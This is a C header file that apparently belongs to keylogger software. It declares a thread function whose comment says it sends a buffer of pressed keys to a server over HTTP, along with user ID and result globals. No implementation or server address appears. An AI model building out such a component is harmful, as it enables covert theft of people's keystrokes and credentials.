#ifndef SENDER_H
#define SENDER_H

extern char* userId;
extern char* result;

/**
 * @brief Sends data from a buffer containing pressed keys to a server via HTTP.
 *
 * @param param Pointer to a void passed by the system to the thread function.
 *              This parameter is unused and should be ignored.
 */
void send_(void* param);

#endif
